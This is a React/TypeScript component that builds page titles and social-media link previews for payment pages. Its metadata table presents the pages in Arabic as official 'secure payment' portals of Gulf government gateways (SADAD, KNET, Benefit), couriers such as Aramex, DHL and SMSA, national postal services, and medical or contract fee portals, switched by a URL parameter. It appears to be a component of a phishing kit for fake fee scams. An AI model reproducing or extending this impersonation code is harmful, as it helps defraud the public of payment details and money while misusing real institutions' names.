import { Helmet } from 'react-helmet-async';
import { getServiceBranding } from '@/lib/serviceLogos';
import { getEntityPaymentShareImage, getEntityIdentity, detectEntityFromURL, getBankOGImage } from '@/lib/dynamicIdentity';

const companyMeta: Record<string, { title: string; description: string; image: string }> = {
  // Government Systems
  gov_sa: {
    title: "بوابة سداد للمدفوعات الحكومية 🇸🇦",
    description: "نظام المدفوعات الوطني السعودي - سدد رسوم الخدمات الحكومية والفواتير بأمان تام وسهولة عبر بوابة سداد الموحدة ✅",
    image: "/assets/dynamic-identity/sadad_hero.jpg"
  },
  gov_ae: {
    title: "بوابة جيوان للمدفوعات الإلكترونية 🇦🇪",
    description: "نظام البطاقة الوطنية الإماراتي - سدد فواتيرك وخدماتك الحكومية بأمان عبر منظومة الدفع الوطنية الإماراتية 💳",
    image: "/assets/dynamic-identity/jaywan_hero.jpg"
  },
  gov_kw: {
    title: "بوابة كي نت للمدفوعات الوطنية 🇰🇼",
    description: "شبكة الكويت الوطنية للمدفوعات الإلكترونية - سدد رسومك الحكومية بأمان وموثوقية عبر بوابة KNET الرسمية 🇰🇼",
    image: "/assets/dynamic-identity/knet_hero.jpg"
  },
  gov_qa: {
    title: "بوابة قطر للمدفوعات الحكومية 🇶🇦",
    description: "نظام الدفع الإلكتروني الموحد لدولة قطر - سدد جميع مستحقات الخدمات الحكومية بأعلى معايير الأمان 🇶🇦",
    image: "/assets/dynamic-identity/qatar_gov_hero.jpg"
  },
  gov_om: {
    title: "بوابة مال للمدفوعات الوطنية 🇴🇲",
    description: "منظومة الدفع الإلكتروني الوطنية لسلطنة عُمان - سداد سريع وآمن لجميع الرسوم والخدمات عبر بوابة مال 🇴🇲",
    image: "/assets/dynamic-identity/maal_hero.jpg"
  },
  gov_bh: {
    title: "بوابة بنفت للمدفوعات الوطنية 🇧🇭",
    description: "الشبكة الإلكترونية البحرينية للمعاملات المالية - سدد رسومك وخدماتك الحكومية بأمان تام عبر منظومة بنفت 🇧🇭",
    image: "/assets/dynamic-identity/benefit_hero.jpg"
  },

  aramex: {
    title: "دفع آمن - أرامكس للشحن السريع 🚚",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅",
    image: "/og-aramex.jpg"
  },
  dhl: {
    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍",
    image: "/og-dhl.jpg"
  },
  fedex: {
    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰",
    image: "/og-fedex.jpg"
  },
  ups: {
    title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍",
    image: "/og-ups.jpg"
  },
  smsa: {
    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦",
    image: "/og-smsa.jpg"
  },
  naqel: {
    title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡",
    image: "/og-naqel.jpg"
  },
  zajil: {
    title: "دفع آمن - زاجل للشحن السريع 📮",
    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦",
    image: "/og-zajil.jpg"
  },
  saudipost: {
    title: "دفع آمن - البريد السعودي 🇸🇦",
    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع الأوسع في المملكة 📦",
    image: "/og-saudipost.jpg"
  },
  empost: {
    title: "دفع آمن - البريد الإماراتي 🇦🇪",
    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن المحلية والدولية الموثوقة ✨",
    image: "/og-empost.jpg"
  },
  qpost: {
    title: "دفع آمن - البريد القطري 🇶🇦",
    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة وآمنة في قطر والعالم 🌍",
    image: "/og-qpost.jpg"
  },
  kwpost: {
    title: "دفع آمن - البريد الكويتي 🇰🇼",
    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل محلية ودولية موثوقة ✅",
    image: "/og-kwpost.jpg"
  },
  omanpost: {
    title: "دفع آمن - البريد العُماني 🇴🇲",
    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل محلية ودولية متميزة 📮",
    image: "/og-omanpost.jpg"
  },
  bahpost: {
    title: "دفع آمن - البريد البحريني 🇧🇭",
    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة وموثوقة في البحرين والعالم ✨",
    image: "/og-bahpost.jpg"
  },
  chalets: {
    title: "تأكيد حجز شاليه - دفع آمن 🏠",
    description: "أكمل عملية الدفع بأمان تام لتأكيد حجز شاليهك المفضل - نظام دفع مشفر وموثوق ✅",
    image: "/assets/dynamic-identity/chalets_image1.svg"
  },
  health_links: {
    title: "تأكيد موعد طبي - دفع آمن 🏥",
    description: "بوابة الحجوزات الطبية الإلكترونية - سدد رسوم الكشف والخدمات الصحية بأمان تام لتأكيد موعدك 🏥",
    image: "/assets/dynamic-identity/health_image1.svg"
  },
  contracts: {
    title: "توثيق عقد إلكتروني - دفع آمن 📄",
    description: "بوابة العقود والتوثيق الموحدة - أكمل سداد رسوم التوثيق لاعتماد عقدك الإلكتروني قانونياً ⚖️",
    image: "/assets/dynamic-identity/contract_image1.svg"
  },
  invoices: {
    title: "سداد فاتورة إلكترونية - دفع آمن 🧾",
    description: "مركز سداد الفواتير الموحد - سدد فواتيرك المستحقة بأمان وسرعة عبر منصتنا المشفرة ✅",
    image: "/assets/dynamic-identity/invoice_image1.svg"
  },
  government_payment: {
    title: "دفع آمن - الخدمات الحكومية 🏛️",
    description: "دفع الخدمات والرسوم الحكومية - سدد رسومك الحكومية إلكترونياً بأمان تام مع سداد، بنفت، مدى وجميع أنظمة الدفع الحكومية المعتمدة ✅",
    image: "/assets/dynamic-identity/official_logo_gov.svg"
  },
  local_payment: {
    title: "دفع آمن - المدفوعات المحلية 💳",
    description: "خدمات الدفع المحلي السريع - سدد مدفوعاتك المحلية بسهولة وأمان مع دعم جميع وسائل الدفع المحلية المعتمدة في دول الخليج 🌍",
    image: "/assets/dynamic-identity/official_logo_local.svg"
  },
  bank_pages: {
    title: "دفع آمن - البنوك الخليجية 🏦",
    description: "الدفع عبر البنوك الخليجية - اختر بنكك المفضل من أكثر من 50 بنك خليجي وأكمل معاملتك المالية بأمان وسرعة فائقة 💎",
    image: "/assets/dynamic-identity/official_logo_bank.svg"
  },
  default: {
    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية بأمان وسهولة تامة",
    image: "/og-aramex.jpg"
  }
};

interface PaymentMetaTagsProps {
  serviceKey: string;
  serviceName: string;
  amount?: string;
  title?: string;
  customDescription?: string;
  description?: string;
}

export const PaymentMetaTags: React.FC<PaymentMetaTagsProps> = ({
  serviceKey,
  serviceName,
  amount,
  title,
  customDescription,
  description,
}) => {
  const branding = getServiceBranding(serviceKey);
  
  const detectedEntity = detectEntityFromURL();
  const entityIdentity = detectedEntity ? getEntityIdentity(detectedEntity) : null;
  const entityShareImage = detectedEntity ? getEntityPaymentShareImage(detectedEntity) : null;
  const entityDescription = entityIdentity?.payment_share_description;
  
  const urlParams = new URLSearchParams(window.location.search);
  const companyParam = urlParams.get('company') || serviceKey;
  const companyMetaData = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
  
  let ogImagePath = entityShareImage || companyMetaData.image || branding.ogImage;
  
  if (serviceKey.startsWith('bank_')) {
    const bankId = serviceKey.replace('bank_', '');
    ogImagePath = getBankOGImage(bankId) || companyMeta.bank_pages.image;
  }
  
  const pageTitle = title || companyMetaData.title;
  const pageDescription = description || customDescription || companyMetaData.description || entityDescription || branding.description;
  const ogImage = ogImagePath ? (ogImagePath.startsWith('http') ? ogImagePath : `${window.location.origin}${ogImagePath}`) : undefined;
  
  return (
    <Helmet>
      <title>{pageTitle}</title>
      <meta name="description" content={pageDescription} />
      
      <meta property="og:type" content="website" />
      <meta property="og:title" content={pageTitle} />
      <meta property="og:description" content={pageDescription} />
      <meta property="og:url" content={window.location.href} />
      {ogImage && (
        <>
          <meta property="og:image" content={ogImage} />
          <meta property="og:image:secure_url" content={ogImage} />
          <meta property="og:image:width" content="1200" />
          <meta property="og:image:height" content="630" />
          <meta property="og:image:alt" content={serviceName} />
          <meta property="og:image:type" content="image/jpeg" />
        </>
      )}
      
      <meta name="twitter:card" content="summary_large_image" />
      <meta name="twitter:title" content={pageTitle} />
      <meta name="twitter:description" content={pageDescription} />
      {ogImage && <meta name="twitter:image" content={ogImage} />}
      
      <meta name="theme-color" content={entityIdentity?.colors.primary || branding.colors.primary} />
      
      {ogImagePath && !ogImagePath.startsWith('http') && <link rel="preload" as="image" href={ogImagePath} />}
      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
      
      <meta name="robots" content="index, follow" />
      <meta name="googlebot" content="index, follow" />
      <link rel="canonical" href={window.location.href} />
    </Helmet>
  );
};

export default PaymentMetaTags;
